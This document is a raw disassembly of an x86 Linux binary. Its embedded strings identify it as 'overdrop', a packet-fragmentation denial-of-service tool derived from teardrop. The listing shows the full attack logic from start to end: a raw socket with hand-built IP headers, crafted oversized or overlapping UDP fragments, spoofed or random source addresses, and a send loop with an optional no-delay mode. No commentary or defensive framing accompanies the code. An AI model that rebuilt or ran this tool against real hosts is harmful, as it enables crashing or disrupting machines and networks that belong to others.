xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
cmp dword [obj.completed.3], 0
jne 0x8048844
jmp 0x804881d
mov esi, esi
lea edx, [eax + 4]
mov dword [obj.p.2], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.2]
cmp dword [eax], 0
jne 0x8048810
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x804883a
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.3], 1
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x804886b
push obj.object.8
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x8048e7e
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048e72
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
push eax
push str._s_dst_ip____n_how_many______s_src_ip______x____use__x_for_express_delivery_._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0xc
push 0
call sym.imp.exit
jmp dword [reloc.fprintf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
push ebx
call 0x804860d
pop ebx
add ebx, 0x1a6f
cmp dword [ebx + 0x6c], 0
je 0x8048622
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._2
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
push eax
call sym.imp.inet_addr
add esp, 4
mov eax, eax
mov edx, eax
mov dword [var_4h], edx
cmp edx, 0xffffffff
jne 0x80488fd
mov eax, dword [arg_8h]
push eax
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0
jne 0x80488e1
xor eax, eax
jmp 0x8048904
mov eax, dword [var_8h]
mov edx, dword [eax + 0xc]
push edx
lea eax, [var_4h]
push eax
mov eax, dword [var_8h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
call sym.imp.bcopy
add esp, 0xc
mov edx, dword [var_4h]
mov eax, edx
jmp 0x8048904
leave
ret
push ebp
mov ebp, esp
sub esp, 0x20
push ebx
mov eax, dword [arg_14h]
mov edx, dword [arg_18h]
mov word [var_2h], ax
mov word [var_4h], dx
mov dword [ptr], 0
mov dword [s1], 0
mov word [var_20h], 2
mov ax, word [var_2h]
mov word [var_1eh], ax
mov eax, dword [arg_10h]
mov dword [var_1ch], eax
push 0x38
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [ptr], eax
mov eax, dword [ptr]
mov dword [s1], eax
push 0x38
mov eax, dword [s1]
push eax
call sym.imp.bzero
add esp, 8
mov byte [s2], 0x45
push 1
lea eax, [s2]
push eax
mov eax, dword [s1]
push eax
call sym.imp.memcpy
add esp, 0xc
add dword [s1], 2
push 0x38
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
add dword [s1], 2
push 0xf2
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
add dword [s1], 2
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov ecx, dword [s1]
mov bx, word [ecx]
or ebx, eax
mov word [edx], bx
add dword [s1], 2
mov eax, dword [s1]
mov word [eax], 0x40
mov byte [s2], 0x11
push 1
lea eax, [s2]
push eax
mov eax, dword [s1]
inc eax
push eax
call sym.imp.memcpy
add esp, 0xc
add dword [s1], 4
mov eax, dword [s1]
mov edx, dword [arg_ch]
mov dword [eax], edx
add dword [s1], 4
mov eax, dword [s1]
mov edx, dword [arg_10h]
mov dword [eax], edx
add dword [s1], 4
movzx eax, word [var_2h]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
add dword [s1], 2
movzx eax, word [var_4h]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
add dword [s1], 2
push 0x24
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
push 0x10
lea edx, [var_20h]
mov eax, edx
push eax
push 0
push 0x38
mov eax, dword [ptr]
push eax
mov eax, dword [arg_8h]
push eax
call sym.imp.sendto
add esp, 0x18
mov eax, eax
cmp eax, 0xffffffff
jne 0x8048a91
push str._nsendto
call sym.imp.perror
add esp, 4
mov eax, dword [ptr]
push eax
call sym.imp.free
add esp, 4
push 1
call sym.imp.exit
add esp, 4
mov ebx, dword [ptr]
add ebx, 2
mov dword [s1], ebx
push 0x18
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
add dword [s1], 4
push 0xffff
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [s1]
mov word [edx], ax
push 0x10
lea edx, [var_20h]
mov eax, edx
push eax
push 0
push 0x18
mov eax, dword [ptr]
push eax
mov eax, dword [arg_8h]
push eax
call sym.imp.sendto
add esp, 0x18
mov eax, eax
cmp eax, 0xffffffff
jne 0x8048b10
push str._nsendto
call sym.imp.perror
add esp, 4
mov eax, dword [ptr]
push eax
call sym.imp.free
add esp, 4
push 1
call sym.imp.exit
add esp, 4
nop
lea esi, [esi]
mov eax, dword [ptr]
push eax
call sym.imp.free
add esp, 4
mov ebx, dword [var_24h]
leave
ret
jmp dword [reloc.malloc]
jmp dword [reloc.bzero]
jmp dword [reloc.memcpy]
jmp dword [reloc.htons]
jmp dword [reloc.sendto]
jmp dword [reloc.perror]
jmp dword [reloc.free]
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_4h], 1
mov dword [var_8h], 0
mov dword [s], 0x1f4
mov dword [var_18h], 0
mov dword [var_1ch], 0
mov word [var_1eh], 0
mov word [var_20h], 0
push str.overdrop_by_lcamtuf__based_on_teardrop_by_routedaemon9__n_n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0xc
mov eax, eax
mov dword [sockfd], eax
cmp dword [sockfd], 0
jge 0x8048ba0
push str.raw_socket
call sym.imp.perror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
nop
push 4
lea eax, [var_4h]
push eax
push 3
push 0
mov eax, dword [sockfd]
push eax
call sym.imp.setsockopt
add esp, 0x14
mov eax, eax
test eax, eax
jge 0x8048bd3
push str.IP_HDRINCL
call sym.imp.perror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
cmp dword [argc], 1
jg 0x8048be7
mov eax, dword [argv]
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 4
mov eax, dword [argv]
add eax, 4
mov edx, dword [eax]
push edx
call sym.name_resolve
add esp, 4
mov eax, eax
mov dword [var_1ch], eax
cmp dword [var_1ch], 0
jne 0x8048c20
push str.Cant_resolve_destination_address._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
push 1
call sym.imp.exit
add esp, 4
nop
push str.s:n:x
mov eax, dword [argv]
push eax
mov eax, dword [argc]
push eax
call sym.imp.getopt
add esp, 0xc
mov eax, eax
mov dword [var_ch], eax
cmp dword [var_ch], 0xffffffff
jne 0x8048c46
jmp 0x8048cd6
mov eax, dword [var_ch]
cmp eax, 0x73
je 0x8048c80
cmp eax, 0x73
jg 0x8048c60
cmp eax, 0x6e
je 0x8048c67
jmp 0x8048cc1
lea esi, [esi]
cmp eax, 0x78
je 0x8048cb8
jmp 0x8048cc1
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov dword [var_8h], eax
jmp 0x8048cd1
lea esi, [esi]
mov eax, dword [obj.optarg]
push eax
call sym.name_resolve
add esp, 4
mov eax, eax
mov dword [var_18h], eax
cmp dword [var_18h], 0
jne 0x8048cb6
push str.Cant_resolve_source_address._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
push 1
call sym.imp.exit
add esp, 4
jmp 0x8048cd1
mov dword [s], 0
jmp 0x8048cd1
mov eax, dword [argv]
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 4
jmp 0x8048cd1
jmp 0x8048c21
push 0
call sym.imp.time
add esp, 4
mov eax, eax
push eax
call sym.imp.srandom
add esp, 4
cmp dword [var_8h], 0
jne 0x8048cf8
mov dword [var_8h], 0xbeef
push str.Sending_oversized_packets:_nFrom:_
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
cmp dword [var_18h], 0
jne 0x8048d26
push str.________random_
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
jmp 0x8048d4e
mov eax, dword [var_18h]
mov dword [in], eax
mov eax, dword [in]
push eax
call sym.imp.inet_ntoa
add esp, 4
mov eax, eax
push eax
push str._15s
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0xc
mov eax, dword [var_1ch]
mov dword [in], eax
mov eax, dword [in]
push eax
call sym.imp.inet_ntoa
add esp, 4
mov eax, eax
push eax
push str._n__To:__15s_n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0xc
mov eax, dword [var_8h]
push eax
push str._Amt:__5d_n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0xc
push 0x804904f
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
mov dword [var_ch], 0
mov eax, dword [var_ch]
cmp eax, dword [var_8h]
jl 0x8048db4
jmp 0x8048e41
cmp dword [var_18h], 0
jne 0x8048df0
call sym.imp.rand
mov eax, eax
movzx edx, ax
push edx
call sym.imp.rand
mov eax, eax
movzx edx, ax
push edx
mov eax, dword [var_1ch]
push eax
call sym.imp.rand
mov eax, eax
push eax
mov eax, dword [sockfd]
push eax
call sym.send_frags
add esp, 0x14
jmp 0x8048e1a
lea esi, [esi]
call sym.imp.rand
mov eax, eax
movzx edx, ax
push edx
call sym.imp.rand
mov eax, eax
movzx edx, ax
push edx
mov eax, dword [var_1ch]
push eax
mov eax, dword [var_18h]
push eax
mov eax, dword [sockfd]
push eax
call sym.send_frags
add esp, 0x14
push str.b00z_
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
mov eax, dword [s]
push eax
call sym.imp.usleep
add esp, 4
inc dword [var_ch]
jmp 0x8048da7
push 0x8049058
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 8
xor eax, eax
jmp 0x8048e58
leave
ret
jmp dword [reloc.socket]
jmp dword [reloc.setsockopt]
jmp dword [reloc.getopt]
jmp dword [reloc.atoi]
jmp dword [reloc.time]
jmp dword [reloc.srandom]
jmp dword [reloc.inet_ntoa]
jmp dword [reloc.rand]
jmp dword [reloc.usleep]
push ebp
mov ebp, esp
push ebx
call 0x8048e95
pop ebx
add ebx, 0x11e7
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.bcopy]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.inet_addr]
jmp dword [reloc.gethostbyname]
